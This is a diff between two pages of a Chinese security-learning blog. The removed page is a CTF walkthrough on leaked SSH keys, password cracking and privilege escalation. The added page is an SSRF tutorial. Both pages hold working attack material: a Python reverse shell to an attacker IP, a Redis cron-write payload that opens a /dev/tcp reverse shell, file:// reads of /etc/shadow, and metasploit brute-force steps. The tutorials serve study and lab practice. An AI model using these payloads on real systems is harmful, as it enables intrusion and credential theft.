@@ -13,23 +13,23 @@
     
     <!--- Seo Part-->
     
-    <link rel="canonical" href="http://example.com/2024/09/11/ssh密钥泄露/"/>
+    <link rel="canonical" href="http://example.com/2024/09/11/fdbfb64754f6/"/>
     <meta name="robots" content="index,follow">
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
     
-        <meta name="description" content="ssh密钥泄露&#x3D;&#x3D;ssh常用端口为22&#x3D;&#x3D; 信息探测先用nmap扫描ip端口探测靶场开放的服务和服务版本：nmap -sV ip 探测靶场全部信息：nmap -A -v ip 探测靶场的操作系统类型和版本： nmap -O ip &#x3D;&#x3D;注意特殊端口（大于1024）&#x3D;&#x3D;  扫描端口目录,寻找隐藏文件dirb http:&#x2F;&#x2F;">
+        <meta name="description" content="SSRF漏洞漏洞介绍服务器请求是从客户端发起一个请求到服务器，服务器再向另外的服务器发起请求的过程。 服务器端清求伪造(Server-side Request Forgery，简称SSRF)，是一种由攻击者构造形成由服务器端发起请求的一个漏洞。SSRF让服务器去请求你通常请求不到的东西，一般用来在外网探测或攻击内网服务。	  **类比CSRF:**服务器端请求伪造攻击将域中的不安全服务器作为代理使">
 <meta property="og:type" content="article">
-<meta property="og:title" content="ssh密钥泄露">
-<meta property="og:url" content="http://example.com/2024/09/11/ssh%E5%AF%86%E9%92%A5%E6%B3%84%E9%9C%B2/index.html">
+<meta property="og:title" content="服务器请求伪造（SSRF）">
+<meta property="og:url" content="http://example.com/2024/09/11/fdbfb64754f6/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="ssh密钥泄露&#x3D;&#x3D;ssh常用端口为22&#x3D;&#x3D; 信息探测先用nmap扫描ip端口探测靶场开放的服务和服务版本：nmap -sV ip 探测靶场全部信息：nmap -A -v ip 探测靶场的操作系统类型和版本： nmap -O ip &#x3D;&#x3D;注意特殊端口（大于1024）&#x3D;&#x3D;  扫描端口目录,寻找隐藏文件dirb http:&#x2F;&#x2F;">
+<meta property="og:description" content="SSRF漏洞漏洞介绍服务器请求是从客户端发起一个请求到服务器，服务器再向另外的服务器发起请求的过程。 服务器端清求伪造(Server-side Request Forgery，简称SSRF)，是一种由攻击者构造形成由服务器端发起请求的一个漏洞。SSRF让服务器去请求你通常请求不到的东西，一般用来在外网探测或攻击内网服务。	  **类比CSRF:**服务器端请求伪造攻击将域中的不安全服务器作为代理使">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2024-09-11T10:55:58.000Z">
-<meta property="article:modified_time" content="2024-09-12T00:18:30.773Z">
+<meta property="article:published_time" content="2024-09-11T10:56:23.000Z">
+<meta property="article:modified_time" content="2024-09-12T00:17:46.222Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="CTF">
-<meta property="article:tag" content="ssh">
+<meta property="article:tag" content="SSRF">
 <meta name="twitter:card" content="summary">
     
     
@@ -52,7 +52,7 @@
     
     <title>
         
-            ssh密钥泄露 -
+            服务器请求伪造（SSRF） -
         
         Dunm1e &#39; s World
     </title>
@@ -491,7 +491,7 @@
 
         <div class="statistics flex justify-around my-2.5">
     <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
-        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">9</div>
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">10</div>
         <div class="label text-third-text-color text-sm">Tags</div>
     </a>
     <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
@@ -499,7 +499,7 @@
         <div class="label text-third-text-color text-sm">Categories</div>
     </a>
     <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
-        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">11</div>
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">12</div>
         <div class="label text-third-text-color text-sm">Posts</div>
     </a>
 </div>
@@ -525,7 +525,7 @@
         <div class="article-title relative w-full">
             
                 <div class="w-full flex items-center pt-6 justify-start">
-                    <h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">ssh密钥泄露</h1>
+                    <h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">服务器请求伪造（SSRF）</h1>
                 </div>
             
             </div>
@@ -546,15 +546,15 @@
                         <div class="article-meta-info">
     <span class="article-date article-meta-item">
         <i class="fa-regular fa-pen-fancy"></i>&nbsp;
-        <span class="desktop">2024-09-11 18:55:58</span>
-        <span class="mobile">2024-09-11 18:55:58</span>
+        <span class="desktop">2024-09-11 18:56:23</span>
+        <span class="mobile">2024-09-11 18:56:23</span>
         <span class="hover-info">Created</span>
     </span>
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2024-09-12 08:18:30</span>
-            <span class="mobile">2024-09-12 08:18:30</span>
+            <span class="desktop">2024-09-12 08:17:46</span>
+            <span class="mobile">2024-09-12 08:17:46</span>
             <span class="hover-info">Updated</span>
         </span>
     
@@ -596,7 +596,7 @@
                     </li>
                 
                     <li>
-                        | <a href="/tags/ssh/">ssh</a>&nbsp;
+                        | <a href="/tags/SSRF/">SSRF</a>&nbsp;
                     </li>
                 
             </ul>
@@ -606,12 +606,12 @@
     
     
         <span class="article-wordcount article-meta-item">
-            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>1.1k Words</span>
+            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>1.7k Words</span>
         </span>
     
     
         <span class="article-min2read article-meta-item">
-            <i class="fa-regular fa-clock"></i>&nbsp;<span>4 Mins</span>
+            <i class="fa-regular fa-clock"></i>&nbsp;<span>6 Mins</span>
         </span>
     
     
@@ -630,87 +630,53 @@
 
 
         <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
-            <h1 id="ssh密钥泄露"><a href="#ssh密钥泄露" class="headerlink" title="ssh密钥泄露"></a>ssh密钥泄露</h1><p>&#x3D;&#x3D;ssh常用端口为22&#x3D;&#x3D;</p>
-<h2 id="信息探测"><a href="#信息探测" class="headerlink" title="信息探测"></a>信息探测</h2><h3 id="先用nmap扫描ip端口"><a href="#先用nmap扫描ip端口" class="headerlink" title="先用nmap扫描ip端口"></a>先用nmap扫描ip端口</h3><p>探测靶场开放的服务和服务版本：<code>nmap -sV ip</code></p>
-<p>探测靶场全部信息：<code>nmap -A -v ip</code></p>
-<p>探测靶场的操作系统类型和版本： <code>nmap -O ip</code></p>
-<p>&#x3D;&#x3D;注意特殊端口（大于1024）&#x3D;&#x3D;</p>
-<hr>
-<h3 id="扫描端口目录-寻找隐藏文件"><a href="#扫描端口目录-寻找隐藏文件" class="headerlink" title="扫描端口目录,寻找隐藏文件"></a>扫描端口目录,寻找隐藏文件</h3><p><code>dirb http://ip:port/</code>（80端口可省略）</p>
-<p>如果探测到.ssh，则可以想到密钥泄露，通过ssh远程登陆</p>
-<p>&#x3D;&#x3D;id_rsa和id_rsa.pub配对成功才能登陆成功&#x3D;&#x3D;</p>
-<p>为此我们可以尝试打开<code>http://ip:port/.ssh/id_rsa</code>目录，可能会下载到id_rsa，也就是私钥</p>
-<hr>
-<h3 id="寻找ssh用户名，得到私钥"><a href="#寻找ssh用户名，得到私钥" class="headerlink" title="寻找ssh用户名，得到私钥"></a>寻找ssh用户名，得到私钥</h3><ol>
-<li><p>然后依次打开后面的目录<br>成功下载后，第二个文件就是一个认证文件，可以找到用户名，ssh连接徐娅用户名，假如用户名为simon</p>
+            <h1 id="SSRF漏洞"><a href="#SSRF漏洞" class="headerlink" title="SSRF漏洞"></a>SSRF漏洞</h1><h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p><strong>服务器请求</strong>是从客户端发起一个请求到服务器，服务器再向另外的服务器发起请求的过程。</p>
+<p><strong>服务器端清求伪造</strong>(Server-side Request Forgery，简称SSRF)，是一种由攻击者构造形成由服务器端发起请求的一个漏洞。SSRF让服务器去请求你通常请求不到的东西，一般用来在外网探测或攻击内网服务。	 </p>
+<p>**类比CSRF:**服务器端请求伪造攻击将域中的不安全服务器作为代理使用，这与利用网页客户端的跨站请求伪造攻击类似(如处在域中的浏览器可作为攻击者的代理)。<br>**漏洞成因:**由于服务端提供了从其他服务器应用获取数据的功能，但又没有对目标地址做严格过滤与限制，导致攻击者可以传入任意的地址来让后端服务器对其发送请求，并返回对该目标地址请求的数据。比如:攻击者传入一个未经验证的 URL，后端代码直接请求这个URL，就会造成 SSRF 漏洞。<br>**漏洞危害:**利用SSRF漏洞，攻击者实际上可以访问内网，可以进行</p>
+<ul>
+<li>读取内网文件;</li>
+<li>扫描内网服务和端口;</li>
+<li>收集内网 web 应用的指纹识别，根据这些信息进行下一步的渗透:</li>
+<li>攻击运行在内网的系统或应用程序.</li>
+</ul>
+<h2 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h2><p><strong>漏洞点：</strong>能够对外发起网络请求的服务器，就可能存在SSRF漏洞</p>
+<p><strong>web功能</strong></p>
+<p>服务器端请求伪造漏洞是在服务端获取其他服务器的相关信息的功能中形成的，因此我们可以列举几种在web应用中常见的从服务端获取其他服务器信息的的功能:</p>
+<ol>
+<li>分享URL:通过目标URL地址获取了title标签和相关文本内容，而如果在此功能中没有对目标地址的范围做过滤与限制则就存在着SSRF漏洞。</li>
+<li>转码服务:通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览。</li>
+<li>在线翻译:通过URL地址翻译对应文本的内容。提供此功能的国内公司有百度、有道等。</li>
+<li>图片加载与下载:通过URL地址加载或下载图片。</li>
+<li>通过api获取远程地址文件来加载内容。</li>
+</ol>
+<p><strong>URL关键字</strong></p>
+<p>寻找需要加载外部资源的URL，可能存在SSRF漏洞。这些URL中经常包含的关键词有<code>share、wap、ur1、link、src、source、target、u、3g、display、sourceURL、imageURL、domain</code>等利用 google 语法(inurl:url&#x3D;)加上这些关键字去寻找 SSRF 漏洞，耐心的验证，可以找到存在的 SSRF漏洞。</p>
+<p><strong>判断漏洞是否存在：</strong>在目标网站上攻击者IP，如果攻击的服务器日志能看到目标服务器对自己发起的请求，说明存在漏洞。</p>
+<h2 id="SSRF利用"><a href="#SSRF利用" class="headerlink" title="SSRF利用"></a>SSRF利用</h2><h3 id="1-读取敏感文件"><a href="#1-读取敏感文件" class="headerlink" title="1. 读取敏感文件"></a>1. 读取敏感文件</h3><p>**file协议:**本地文件传输协议，用于访问本地计算机中的文件。好比通过Windows的资源管理器中打开文件或者通过右键单击打开一样。格式:file:&#x2F;&#x2F;filepath</p>
+<p><strong>重要文件：</strong></p>
+<ol>
+<li>&#x2F;etc&#x2F;passwd:在Linux中，&#x2F;etc&#x2F;passwd文件中一行记录对应着一个用户，每行记录又被冒号(:)分隔为7个字段:<code>用户名:口令:用户标识号:组标识号:注释性描述:主目录:登录 shell</code></li>
+<li>&#x2F;etc&#x2F;shadow:用于存储 Linux 系统中用户的密码信息，只有 root 用户拥有读权限，其他用户没有任何权限。</li>
+<li>&#x2F;etc&#x2F;hosts:在linux中，主要作用是定义IP地址和主机名的映射关系，是一个映射IP地址和主机名的规定。可以用文本文件打开!当用户在浏览器中输入一个网址时，系统会首先自动从hosts文件中寻找对应的IP地址，一旦找到，浏览器会立即打开对应网页，如果没有找到，则浏览器会将网址提交DNS服务器进行IP地址解析。</li>
+</ol>
+<h3 id="2-探测内网服务"><a href="#2-探测内网服务" class="headerlink" title="2. 探测内网服务"></a>2. 探测内网服务</h3><p>**dict协议:**一个字典服务器协议，在ssrf中常用于探测日标服务器端口上运行的服务版本信息。格式:dict:&#x2F;&#x2F;ip:port。先利用file协议读取&#x2F;etc&#x2F;hosts获取ip，通过 dict 协议读取目标服务器端口上运行的服务版本信息</p>
+<p>探测内网存活IP和开放端口:可利用BurpSuite，批量探测存活IP和开放端口。</p>
+<ol>
+<li><p>开启Burpsuite，并访问待测试的网站:<a class="link"   target="_blank" rel="noopener" href="http://120.27.61.239:8006/source/index.php" >http://120.27.61.239:8006/source/index.php <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>;</p>
 </li>
-<li><p>可能在网站主页寻找</p>
+<li><p>将抓到的包发送到Intruder模块，设置IP或者端口，进行爆破;</p>
 </li>
 </ol>
-<p><code>ssh -i id_rsa simon@ip</code></p>
-<hr>
-<h4 id="利用nikto寻找是否有私钥"><a href="#利用nikto寻找是否有私钥" class="headerlink" title="利用nikto寻找是否有私钥"></a>利用nikto寻找是否有私钥</h4><p><code>nikto -host ip</code></p>
-<p>可以扫描出敏感目录并且提示 </p>
-<p>如果探测到robot.txt，打开可以查看不可以被探测的目录，可以寻找到相关信息或者flag1；&#x3D;&#x3D;注意config之类的文件&#x3D;&#x3D;</p>
-<p>可以利用<code>wget url</code>来下载文件</p>
-<h4 id="如果只有公钥"><a href="#如果只有公钥" class="headerlink" title="如果只有公钥"></a>如果只有公钥</h4><p>然后会提示输入密码，尝试root&#x2F;用户名。错误则继续探测</p>
-<p>ssh2john id_rsa &gt; rsacrack</p>
-<p>zcat &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt.gz | john –pipe -rules isacrack</p>
-<p>然后利用破解的密码进行ssh登录</p>
-<hr>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="暴力破解思路"><a href="#暴力破解思路" class="headerlink" title="暴力破解思路"></a>暴力破解思路</h3><p>先下载cupp</p>
-<p><code>git clone https://github.com/jeanphorn/common-password.git</code></p>
-<p>进入目录给cupp.py提权 <code>chmod +x cupp.py</code></p>
-<p>以交互方式创建字典 <code>./cupp.py -i</code></p>
-<p>利用metasploit破解ssh</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line">use auxiliary/scanner/ssh/ssh_login</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> rhosts ip</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> username name(对应用户名)</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> pass_file name.txt(前面生成的字典)</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> threads 5(设置线程)</span><br><span class="line"></span><br><span class="line">show options(查看参数)</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> verbose <span class="literal">true</span>(返回相关信息)</span><br><span class="line"></span><br><span class="line">run</span><br></pre></td></tr></table></figure></div>
+<p><strong>探测内网redis：</strong>REmote Dlctionary Server(Redis)是一个由 Salvatore Sanfilippo 写的 key-value 存储系统，是跨平台的非关系型数据库。Redis一般绑定在本地(不允许远程访问)，默认不开启认证，默认端口为6379。如果在没有开启认证的情况下，可以导致任意用户利用ssrf漏洞攻击内网中的未授权Redis以及读取Redis的数据。使用dict:&#x2F;&#x2F;127.0.0.1:6379 有返回信息，说明存在redis数据库</p>
+<p>同样可以利用Burp进行爆破</p>
+<h3 id="3-攻击内网应用"><a href="#3-攻击内网应用" class="headerlink" title="3. 攻击内网应用"></a>3. 攻击内网应用</h3><p>攻击者在未授权访问Redis的情况下可以利用Redis的相关方法，如果运行redis 的用户是root 用户，攻击者可以通过写<strong>定时任务</strong>的方式进行反弹shell。<br>定时任务类似日常生活之中的闹钟，主要用于定时执行某些命令，达到定时处理数据的作用。不同的系统定时任务保存位置不一样，比如:<br>centos(cat &#x2F;etc&#x2F;redhat-release)，在&#x2F;var&#x2F;spool&#x2F;cron&#x2F;日录下;<br>ubuntu(cat &#x2F;etc&#x2F;lsb-release)，在&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F; 目录下。</p>
+<p><strong>攻击payload:</strong></p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">dict://127.0.0.1:6379/info //查看信息</span><br><span class="line">dict://127.0.0.1:6379/flusha11 //清空数据库(慎用)</span><br><span class="line">dict://127.0.0.1:6379/config set dir /var/spoo1/cron/ //设置工作目录</span><br><span class="line">dict://127.0.0.1:6379/config set dbfilename root //设置备份文件名</span><br><span class="line">dict://127.0.0.1:6379/set x &quot;\n***** bash -i &amp;&gt; /dev/tcp/攻击机IP/port 0&gt;&amp;1\n&quot;//反弹she11</span><br><span class="line">dict://127.0.0.1:6379/save</span><br></pre></td></tr></table></figure></div>
 
-<p>破解密码后，重新启动msfconsole，并输入相关参数，但是密码直接设置为破解出来的密码pwd</p>
-<p><code>set password pwd</code></p>
-<p>打开会话</p>
-<p><code>sessions -i l</code></p>
-<p>优化终端</p>
-<p>python -c “import pty;pty.spawn(‘&#x2F;bin&#x2F;bash’)”</p>
-<p>然后输入</p>
-<p><code>su - root</code></p>
-<p>输入破解出来的密码pwd，成功提权</p>
-<hr>
-<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>挖掘是否有定时任务 &#96;car &#x2F;etc&#x2F;crontab</p>
-<p>如果有定时计划文件但是具体目录下没有这个定时执行的文件，可以自行创建反弹shell，然后netcat执行监听获取对应用户的权限</p>
-<p>如果有定时执行的文件，可以切换到对应目录，查看对应权限，查看当前用户是否有读写权限</p>
-<p>反弹shell编写</p>
-<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">`#!/usr/bin/python`</span><br><span class="line"></span><br><span class="line">`import os,subprocess,socket`</span><br><span class="line"></span><br><span class="line">`s=socket.socekt(socket.AF_INET,socket.SOCK_STREAM)`(参数可不加，表示使用以太网和tcp套接字)</span><br><span class="line"></span><br><span class="line">s.connect((&quot;攻击机IP地址&quot;,&quot;攻击机监听端口”))</span><br><span class="line"></span><br><span class="line">os.dup2(s.fileno(),0)</span><br><span class="line"></span><br><span class="line">os.dup2(s.fileno(),1)</span><br><span class="line"></span><br><span class="line">os.dup2(s.fileno(),2)</span><br><span class="line"></span><br><span class="line">p=subprocess.call([&quot;/bin/sh&quot;,&quot;-¡&quot;])</span><br></pre></td></tr></table></figure></div>
+<p>然后攻击机进行监听</p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp port</span><br></pre></td></tr></table></figure></div>
 
-<p>攻击机netcat命令监听相关端口（未占用）</p>
-<p><code>nc -lvp 端口</code></p>
-<p>查看占用端口 <code>netstat -pantu</code></p>
-<hr>
-<h3 id="利用自带文件产生溢出调用bash"><a href="#利用自带文件产生溢出调用bash" class="headerlink" title="利用自带文件产生溢出调用bash"></a>利用自带文件产生溢出调用bash</h3><p>登陆后发现不是root权限，于是查看根目录</p>
-<p><code>cd /root</code>  <code>ls</code></p>
-<p>可能会发现flag.txt，但是可能没有权限直接打开</p>
-<p>于是查找具有root权限的文件</p>
-<p><code>find / -perm -4000 2&gt;/dev/null</code></p>
-<p>发现read_message名字与根目录类似</p>
-<p><code>cat read_message.c</code></p>
-<p>可能会找到flag2</p>
-<p>代码审计下面的c语言</p>
-<p>发现调用这个message这个文件并输出相关信息</p>
-<p>打开read_message</p>
-<p><code>read_message</code></p>
-<p>然后我们输入SimonAAA</p>
-<p>发现程序只对比到前五个字符，正确就执行程序，于是我们打算溢出字符串buf数组（20长度），然后利用输入的&#x2F;bin&#x2F;sh占用程序，被execve调用，然后成功提权</p>
-<hr>
-<h3 id="得到flag"><a href="#得到flag" class="headerlink" title="得到flag"></a>得到flag</h3><p>寻找根目录  <code>/root</code></p>
-<p>然后就可以成功打开flag.txt文件</p>
-<hr>
-<h2 id="NOTE"><a href="#NOTE" class="headerlink" title="NOTE"></a>NOTE</h2><ol>
-<li>查看当前用户<code>whoami</code></li>
-<li>查看当前用户的权限<code>id</code></li>
-<li>查看所有用户的列表 <code>cat/etc/passwd</code></li>
-<li>查看用户组 <code>cat /etc/group</code></li>
-<li>查看属于某些用户的文件<code>find / -user 用户名</code></li>
-<li>查看缓冲文件目录 <code>/tmp</code></li>
-</ol>
+<p>定时任务执行后就会反弹shell到攻击机</p>
 
         </div>
 
@@ -718,18 +684,18 @@
             <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
                 <div class="article-copyright-info-container">
     <ul>
-        <li><strong>Title:</strong> ssh密钥泄露</li>
+        <li><strong>Title:</strong> 服务器请求伪造（SSRF）</li>
         <li><strong>Author:</strong> Dunm1e</li>
         <li><strong>Created at
-                :</strong> 2024-09-11 18:55:58</li>
+                :</strong> 2024-09-11 18:56:23</li>
         
             <li>
                 <strong>Updated at
-                    :</strong> 2024-09-12 08:18:30
+                    :</strong> 2024-09-12 08:17:46
             </li>
         
         <li>
-            <strong>Link:</strong> https://dunm1e.github.io/2024/09/11/ssh密钥泄露/
+            <strong>Link:</strong> https://dunm1e.github.io/2024/09/11/fdbfb64754f6/
         </li>
         <li>
             <strong>
@@ -755,7 +721,7 @@
                     </li>
                 
                     <li class="tag-item mx-0.5">
-                        <a href="/tags/ssh/">#ssh</a>&nbsp;
+                        <a href="/tags/SSRF/">#SSRF</a>&nbsp;
                     </li>
                 
             </ul>
@@ -769,13 +735,13 @@
                     <div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
                         <a class="prev"
                         rel="prev"
-                        href="/2024/09/11/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%EF%BC%88SSRF%EF%BC%89/"
+                        href="/2024/09/11/93f6ba8bb1f2/"
                         >
                             <span class="left arrow-icon flex justify-center items-center">
                                 <i class="fa-solid fa-chevron-left"></i>
                             </span>
                             <span class="title flex justify-center items-center">
-                                <span class="post-nav-title-item">服务器请求伪造（SSRF）</span>
+                                <span class="post-nav-title-item">ctf 基本思路</span>
                                 <span class="post-nav-item">Prev posts</span>
                             </span>
                         </a>
@@ -785,10 +751,10 @@
                     <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
                         <a class="next"
                         rel="next"
-                        href="/2024/09/11/sql%E6%B3%A8%E5%85%A5%EF%BC%88web%E7%95%8C%E9%9D%A2%EF%BC%89/"
+                        href="/2024/09/11/478a9824d4db/"
                         >
                             <span class="title flex justify-center items-center">
-                                <span class="post-nav-title-item">sql注入（web界面）</span>
+                                <span class="post-nav-title-item">ssh密钥泄露</span>
                                 <span class="post-nav-item">Next posts</span>
                             </span>
                             <span class="right arrow-icon flex justify-center items-center">
@@ -851,8 +817,8 @@
             <div class="post-toc-wrap">
     <div class="post-toc">
         <div class="toc-title">On this page</div>
-        <div class="page-title">ssh密钥泄露</div>
-        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#ssh%E5%AF%86%E9%92%A5%E6%B3%84%E9%9C%B2"><span class="nav-text">ssh密钥泄露</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%8E%A2%E6%B5%8B"><span class="nav-text">信息探测</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%88%E7%94%A8nmap%E6%89%AB%E6%8F%8Fip%E7%AB%AF%E5%8F%A3"><span class="nav-text">先用nmap扫描ip端口</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%89%AB%E6%8F%8F%E7%AB%AF%E5%8F%A3%E7%9B%AE%E5%BD%95-%E5%AF%BB%E6%89%BE%E9%9A%90%E8%97%8F%E6%96%87%E4%BB%B6"><span class="nav-text">扫描端口目录,寻找隐藏文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AF%BB%E6%89%BEssh%E7%94%A8%E6%88%B7%E5%90%8D%EF%BC%8C%E5%BE%97%E5%88%B0%E7%A7%81%E9%92%A5"><span class="nav-text">寻找ssh用户名，得到私钥</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-text">提权</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E6%80%9D%E8%B7%AF"><span class="nav-text">暴力破解思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="nav-text">反弹shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E8%87%AA%E5%B8%A6%E6%96%87%E4%BB%B6%E4%BA%A7%E7%94%9F%E6%BA%A2%E5%87%BA%E8%B0%83%E7%94%A8bash"><span class="nav-text">利用自带文件产生溢出调用bash</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BE%97%E5%88%B0flag"><span class="nav-text">得到flag</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#NOTE"><span class="nav-text">NOTE</span></a></li></ol></li></ol>
+        <div class="page-title">服务器请求伪造（SSRF）</div>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#SSRF%E6%BC%8F%E6%B4%9E"><span class="nav-text">SSRF漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D"><span class="nav-text">漏洞介绍</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0"><span class="nav-text">漏洞发现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SSRF%E5%88%A9%E7%94%A8"><span class="nav-text">SSRF利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E8%AF%BB%E5%8F%96%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6"><span class="nav-text">1. 读取敏感文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E6%8E%A2%E6%B5%8B%E5%86%85%E7%BD%91%E6%9C%8D%E5%8A%A1"><span class="nav-text">2. 探测内网服务</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91%E5%BA%94%E7%94%A8"><span class="nav-text">3. 攻击内网应用</span></a></li></ol></li></ol></li></ol>
 
     </div>
 </div>
@@ -887,11 +853,11 @@
                 
                 <p class="post-count space-x-0.5">
                     <span>
-                        11 posts in total
+                        12 posts in total
                     </span>
                     
                         <span>
-                            12.8k words in total
+                            13.3k words in total
                         </span>
                     
                 </p>
